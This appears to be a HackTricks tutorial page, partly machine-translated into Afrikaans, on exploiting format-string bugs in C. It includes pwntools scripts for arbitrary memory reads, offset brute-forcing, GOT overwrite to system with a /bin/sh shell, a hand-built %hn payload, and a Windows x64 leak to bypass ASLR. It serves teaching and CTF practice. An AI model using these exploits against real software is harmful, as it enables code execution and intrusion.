# Format Strings

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

In C **`printf`** is 'n funksie wat gebruik kan word om 'n string uit te druk. Die **eerste parameter** wat hierdie funksie verwag, is die **ruwe teks met die formateerders**. Die **volgende parameters** wat verwag word, is die **waardes** om die **formateerders** in die ruwe teks te **vervang**.

Ander kwesbare funksies is **`sprintf()`** en **`fprintf()`**.

Die kwesbaarheid verskyn wanneer 'n **aanvaller se teks as die eerste argument** aan hierdie funksie gebruik word. Die aanvaller sal in staat wees om 'n **spesiale invoer wat misbruik maak van** die **printf format** string-vaardighede om te lees en om **enige data by enige adres (leesbaar/skryfbaar) te skryf**. Op hierdie manier kan hulle **willekeurige kode uitvoer**.

#### Formateerders:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%p —> Pointer
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**Voorbeelde:**

- Kwetsbare voorbeeld:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
- Normale Gebruik:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
- Met Ontbrekende Argumente:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
- fprintf kwesbaar:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input can include formatters!
fclose(output_file);
return 0;
}
```
### **Toegang tot aanwysers**

Die formaat **`%<n>$x`**, waar `n` 'n getal is, laat toe om aan printf aan te dui om die n-de parameter (van die stack) te kies. Dus, as jy die 4de parameter van die stack met printf wil lees, kan jy dit so doen:
```c
printf("%x %x %x %x")
```
en jy sou van die eerste tot die vierde parameter lees.

Of jy kan dit so doen:
```c
printf("%4$x")
```
en lees direk die vierde.

Notice that the attacker controls the `printf` **parameter, which basically means that** his input is going to be in the stack when `printf` is called, which means that he could write specific memory addresses in the stack.

> [!CAUTION]
> `n attacker wat hierdie input beheer, sal in staat wees om` **add arbitrary address in the stack and make `printf` access them**. In die volgende afdeling sal verduidelik word hoe om hierdie gedrag te gebruik.

## **Arbitrary Read**

Dit is moontlik om die formatter **`%n$s`** te gebruik om **`printf`** die **address** te laat kry wat in die **n position** geleë is, dit te volg en **dit te print asof dit was 'n string** (print tot 'n 0x00 gevind word). Dus as die base address van die binary **`0x8048000`**, en ons weet dat die user input in die 4th position in die stack begin, is dit moontlik om die starting van die binary te print met:
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
> [!CAUTION]
> Let wel dat jy nie die adres 0x8048000 aan die begin van die invoer kan plaas nie omdat die string 'n 0x00 aan die einde van daardie adres sal hê.

### Vind offset

Om die offset na jou invoer te vind, kan jy 4 of 8 bytes (`0x41414141`) stuur, gevolg deur **`%1$x`**, en die waarde **verhoog** totdat jy die `A's` terugkry.

<details>

<summary>Brute Force printf offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### How useful

Arbitrary reads kan nuttig wees vir:

- **Dump** die **binary** vanaf geheue
- **Access specific parts of memory where sensitive** **info** is stored (soos canaries, encryption keys of custom passwords soos in hierdie [**CTF challenge**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))

## **Arbitrary Write**

Die formatter **`%<num>$n`** **skryf** die **aantal geskryfde bytes** na die **aangewese adres** in die <num> parameter op die stack. As 'n attacker soveel karakters kan skryf as hy wil met printf, sal hy in staat wees om **`%<num>$n`** 'n arbitrary getal na 'n arbitrary adres te laat skryf.

Gelukkig hoef jy nie 9999 "A"s by die invoer te voeg om die getal 9999 te skryf nie; dit is moontlik om die formatter **`%.<num-write>%<num>$n`** te gebruik om die getal **`<num-write>`** in die **adres waarna die `num` posisie wys** te skryf.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
Neem egter kennis dat gewoonlik, om 'n address' soos `0x08049724` (wat 'n HUGE number is om in een keer te skryf) te skryf, **word `$hn`** in plaas van `$n` gebruik. Dit maak dit moontlik om **slegs 2 Bytes** te skryf. Daarom word hierdie operasie twee keer uitgevoer: een keer vir die hoogste 2B van die address en nog 'n keer vir die laagste.

Dus laat hierdie kwesbaarheid toe om **enigiets in enige address te skryf (arbitrary write).**

In hierdie voorbeeld is die doel om die **address** van 'n **function** in die **GOT**-tabel wat later aangeroep gaan word, te **oor skryf**. Alhoewel dit ook ander arbitrary write to exec-tegnieke kan misbruik:


{{#ref}}
../arbitrary-write-2-exec/
{{#endref}}

Ons gaan 'n **function** oor skryf wat sy **arguments** van die **user** ontvang en dit na die **`system`** **function** wys.\
Soos vermeld, om die address te skryf is daar gewoonlik 2 stappe nodig: eers skryf jy 2 Bytes van die address en dan die ander 2. Hiervoor word **`$hn`** gebruik.

- **HOB** verwys na die 2 hoër bytes van die address
- **LOB** verwys na die 2 laer bytes van die address

Dan, as gevolg van hoe format string werk, moet jy **eers die kleinste** van \[HOB, LOB] skryf en dan die ander een.

If HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

If HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
### Pwntools-sjabloon

Jy kan 'n **sjabloon** vind om 'n exploit voor te berei vir hierdie tipe kwesbaarheid in:


{{#ref}}
format-strings-template.md
{{#endref}}

Of hierdie basiese voorbeeld van [**here**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings to BOF

Dit is moontlik om die skryf-aksies van 'n format string kwetsbaarheid te misbruik om **in adresse van die stack te skryf** en 'n **buffer overflow** tipe kwesbaarheid uit te buit.


## Windows x64: Format-string leak om ASLR te omseil (no varargs)

Op Windows x64 word die eerste vier integer/pointer parameters in registers deurgegee: RCX, RDX, R8, R9. In baie foutiewe call-sites word die attacker-controlled string as die format argument gebruik, maar geen variadic arguments word voorsien nie, byvoorbeeld:
```c
// keyData is fully controlled by the client
// _snprintf(dst, len, fmt, ...)
_snprintf(keyStringBuffer, 0xff2, (char*)keyData);
```
Omdat geen variadiese argumente oorgedra word nie, sal enige conversie soos "%p", "%x", "%s" die CRT veroorsaak om die volgende variadiese argument uit die toepaslike register te lees. Met die Microsoft x64 calling convention kom die eerste sodanige lees vir "%p" uit R9. Watter tydelike waarde ook al in R9 by die call-site is, sal uitgeprint word. In praktyk this often leaks a stable in-module pointer (e.g., a pointer to a local/global object previously placed in R9 by surrounding code or a callee-saved value), wat gebruik kan word om die module base te herstel en ASLR te omseil.

Praktiese werkvloei:

- Inspuit 'n onskadelike formaat soos "%p " heel aan die begin van die deur die aanvaller beheerste string sodat die eerste konversie uitgevoer word voordat enige filtering plaasvind.
- Vang die leaked pointer, identifiseer die statiese offset van daardie objek binne die module (deur een keer te reverseer met simbole of 'n lokale kopie), en herstel die image base as `leak - known_offset`.
- Herbruik daardie base om absolute adresse vir ROP gadgets en IAT entries op afstand te bereken.

Voorbeeld (verkorte python):
```python
from pwn import remote

# Send an input that the vulnerable code will pass as the "format"
fmt = b"%p " + b"-AAAAA-BBB-CCCC-0252-"  # leading %p leaks R9
io = remote(HOST, 4141)
# ... drive protocol to reach the vulnerable snprintf ...
leaked = int(io.recvline().split()[2], 16)   # e.g. 0x7ff6693d0660
base   = leaked - 0x20660                     # module base = leak - offset
print(hex(leaked), hex(base))
```
Notes:
- Die presiese offset om af te trek word een keer gevind tydens plaaslike reversing en daarna hergebruik (dieselfde binary/weergawe).
- As "%p" nie 'n geldige pointer op die eerste poging afdruk nie, probeer ander specifiers ("%llx", "%s") of meerdere konversies ("%p %p %p") om ander argument registers/stack te bemonster.
- Hierdie patroon is spesifiek vir die Windows x64 calling convention en printf-family implementasies wat nie-bestaande varargs uit registers haal wanneer die format string dit versoek.

Hierdie tegniek is uiters nuttig om ROP te bootstrap op Windows services wat met ASLR saamgestel is en geen voor die hand liggende memory disclosure primitives het nie.

## Other Examples & References

- [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
- [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
- [https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html](https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html)
- 32 bit, no relro, no canary, nx, no pie, basiese gebruik van format strings om die flag vanaf die stack te leak (geen behoefte om die uitvoeringvloei te verander nie)
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, no canary, nx, no pie, format string om die adres van `fflush` oor te skryf met die win-funksie (ret2win)
- [https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html](https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html)
- 32 bit, relro, no canary, nx, no pie, format string om 'n adres binne main in `.fini_array` te skryf (sodat die vloei nog 1 keer teruglus) en die adres na `system` in die GOT-tabel te skryf wat na `strlen` wys. Wanneer die vloei teruggaan na main, word `strlen` met gebruikersinvoer uitgevoer en, aangesien dit na `system` wys, sal dit die deurgegewe opdragte uitvoer.


## References

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [x64 calling convention (MSVC)](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)

{{#include ../../banners/hacktricks-training.md}}
